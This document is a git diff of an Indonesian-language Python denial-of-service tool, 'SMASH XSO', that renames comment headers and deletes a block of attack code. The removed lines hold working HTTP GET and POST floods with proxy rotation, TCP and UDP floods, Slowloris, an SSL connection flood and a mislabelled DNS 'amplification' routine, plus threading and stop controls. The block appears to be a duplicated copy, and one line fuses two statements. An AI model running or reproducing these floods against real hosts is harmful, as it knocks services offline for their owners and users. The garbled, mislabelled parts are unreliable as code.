@@ -207,7 +207,7 @@ all_methods = {
     "8": slowloris,
 }
 
-# Pilih metode berdasarkan input user
+# ========== PILIH METODE ==========
 if method_choice == "9":
     selected_methods = list(all_methods.values())
     print(f"{G}[+] Menggunakan SEMUA metode (acak){N}")
@@ -219,7 +219,7 @@ else:
         print(f"{R}[!] Pilihan tidak valid, menggunakan semua metode.{N}")
         selected_methods = list(all_methods.values())
 
-# Tambahkan ICMP hanya jika root dan metode dipilih (jika user pilih 1 atau 9)
+# ========== CEK ICMP + ROOT ==========
 if os.geteuid() != 0:
     if method_choice == "1" or method_choice == "9":
         print(f"{Y}[!] ICMP Flood membutuhkan root, lewati.{N}")
@@ -237,208 +237,6 @@ for i in range(THREAD_COUNT):
     threads.append(t)
 
 print(f"{G}[+] SMASH XSO — Serangan dimulai! {N}")
-print(f"{C}Ketik {R}stop{N}{C} untuk menghentikan serangan.{N}\n")
-
-# ========== LISTENER STOP ==========
-def stop_listener():
-    global stop_attack
-    while True:
-        cmd = input().strip().lower()
-        if cmd == "stop":
-            stop_attack = True
-            print(f"\n{R}🛑 Perintah stop diterima. Menghentikan serangan...{N}")
-            break
-
-listener_thread = threading.Thread(target=stop_listener)
-listener_thread.daemon = True
-listener_thread.start()
-
-# ========== DURASI & MONITOR ==========
-if DURATION > 0:
-    time.sleep(DURATION)
-    stop_attack = True
-    print(f"\n{R}🛑 Serangan selesai setelah {DURATION} detik.{N}")
-    sys.exit()
-
-try:
-    while not stop_attack:
-        time.sleep(5)
-        print(f"{C}[+] SMASH XSO — Thread aktif: {threading.active_count()} | Target: {host}{N}")
-except KeyboardInterrupt:
-    stop_attack = True
-    print(f"\n{R}🛑 SMASH XSO — Serangan dihentikan.{N}")
-    sys.exit()print(f"\n{G}="*60)
-print(f"{R}☠️ SMASH XSO — 7 LAYER DDOS ULTIMATE ☠️{N}")
-print(f"{G}="*60 + f"{N}")
-print(f"{G}Target : {W}{TARGET_URL}{N}")
-print(f"{G}IP     : {W}{ip}:{port}{N}")
-print(f"{G}Thread : {W}{THREAD_COUNT}{N}")
-print(f"{G}Durasi : {W}{'Unlimited' if DURATION == 0 else f'{DURATION} detik'}{N}")
-print(f"{G}Proxy  : {W}{'Ya' if USE_PROXY else 'Tidak'}{N}")
-print(f"{G}Layer  : {W}{', '.join(map(str, selected))}{N}")
-print(f"{G}="*60 + f"{N}\n")
-
-# ========== FLAG STOP ==========
-stop_attack = False
-
-# ========== PROXY LOADER ==========
-proxy_list = []
-if USE_PROXY:
-    try:
-        with open("proxy.txt", "r") as f:
-            proxy_list = f.read().splitlines()
-        print(f"{G}[+] Loaded {len(proxy_list)} proxies{N}")
-    except:
-        print(f"{R}[!] proxy.txt tidak ditemukan, lanjut tanpa proxy{N}")
-        USE_PROXY = False
-
-# ========== DEFINISI SEMUA 7 LAYER ==========
-
-# Layer 7: HTTP GET Flood
-def http_flood():
-    global stop_attack
-    session = requests.Session()
-    headers = {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-        ]),
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Cache-Control": "no-cache",
-        "Referer": "https://google.com",
-    }
-    while not stop_attack:
-        try:
-            rand_param = random.randint(1, 999999)
-            if USE_PROXY and proxy_list:
-                proxy = random.choice(proxy_list)
-                proxies = {"http": proxy, "https": proxy}
-                session.get(f"{TARGET_URL}?id={rand_param}", headers=headers, proxies=proxies, timeout=2)
-            else:
-                session.get(f"{TARGET_URL}?id={rand_param}", headers=headers, timeout=2)
-        except:
-            pass
-
-# Layer 4: TCP SYN Flood
-def tcp_flood():
-    global stop_attack
-    while not stop_attack:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.3)
-            s.connect((ip, port))
-            s.send(b"GET " + path.encode() + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
-            s.close()
-        except:
-            pass
-
-# Layer 4: UDP Flood
-def udp_flood():
-    global stop_attack
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while not stop_attack:
-        try:
-            payload = random._urandom(65500)
-            s.sendto(payload, (ip, port))
-        except:
-            pass
-
-# Layer 7: Slowloris
-def slowloris():
-    global stop_attack
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((ip, port))
-        s.send(b"GET / HTTP/1.1\r\n")
-        s.send(b"Host: " + host.encode() + b"\r\n")
-        s.send(b"User-Agent: Mozilla/5.0\r\n")
-        while not stop_attack:
-            s.send(b"X-Header: " + str(random.randint(1, 9999)).encode() + b"\r\n")
-            time.sleep(random.uniform(0.5, 3))
-    except:
-        pass
-
-# Layer 7: HTTP POST Flood
-def http_post_flood():
-    global stop_attack
-    headers = {"User-Agent": "Mozilla/5.0"}
-    while not stop_attack:
-        try:
-            data = {"random": random.randint(1, 999999), "data": random._urandom(100).hex()}
-            if USE_PROXY and proxy_list:
-                proxy = random.choice(proxy_list)
-                proxies = {"http": proxy, "https": proxy}
-                requests.post(TARGET_URL, data=data, headers=headers, proxies=proxies, timeout=2)
-            else:
-                requests.post(TARGET_URL, data=data, headers=headers, timeout=2)
-        except:
-            pass
-
-# Layer 6: SSL Renegotiation
-def ssl_flood():
-    global stop_attack
-    try:
-        import ssl
-        context = ssl.create_default_context()
-        while not stop_attack:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                sock.connect((ip, port))
-                ssl_sock = context.wrap_socket(sock, server_hostname=host)
-                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
-                ssl_sock.close()
-            except:
-                pass
-    except:
-        pass
-
-# Layer 5: DNS Amplification
-def dns_amp():
-    global stop_attack
-    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while not stop_attack:
-        try:
-            dns = random.choice(dns_servers)
-            query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
-            s.sendto(query, (dns, 53))
-            s.sendto(query, (ip, 53))
-        except:
-            pass
-
-# ========== MAPPING LAYER 1-7 ==========
-layer_map = {
-    1: http_flood,
-    2: tcp_flood,
-    3: udp_flood,
-    4: slowloris,
-    5: http_post_flood,
-    6: ssl_flood,
-    7: dns_amp
-}
-
-# Ambil fungsi-fungsi yang dipilih
-attack_methods = [layer_map[num] for num in selected if num in layer_map]
-
-if not attack_methods:
-    print(f"{R}[!] Gak ada metode valid, keluar.{N}")
-    sys.exit(1)
-
-# ========== THREADING ==========
-threads = []
-for i in range(THREAD_COUNT):
-    t = threading.Thread(target=random.choice(attack_methods))
-    t.daemon = True
-    t.start()
-    threads.append(t)
-
-print(f"{G}[+] SMASH XSO — {len(attack_methods)} layer aktif! {N}")
 print(f"{C}Ketik {R}stop{N}{C} untuk menghentikan serangan.{N}\n")
 
 # ========== LISTENER STOP ==========
